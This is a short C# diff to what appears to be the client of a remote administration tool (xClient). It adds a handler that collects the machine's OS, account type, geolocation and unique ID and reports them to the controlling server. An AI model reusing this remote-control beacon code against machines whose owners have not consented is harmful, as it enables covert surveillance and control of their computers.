@@ -3,6 +3,16 @@ using System.Drawing;
 using System.Runtime.InteropServices;
 using xClient.Core.RemoteShell;
 using xClient.Core.Helper;
+using System.Drawing.Imaging;
+using System.Reflection;
+using System;
+using System.Net;
+using System.IO;
+using System.Windows.Forms;
+using System.Diagnostics;
+using Microsoft.Win32;
+using xClient.Config;
+using System.Threading;
 
 namespace xClient.Core.Commands
 {
@@ -29,5 +39,15 @@ namespace xClient.Core.Commands
         private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
         private const int MOUSEEVENTF_RIGHTUP = 0x10;
         private const string DELIMITER = "$E$";
+
+        public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
+        {
+            SystemCore.InitializeGeoIp();
+            new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
+                SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
+                SystemCore.GetId()).Execute(client);
+        }
+
+       
     }
 }
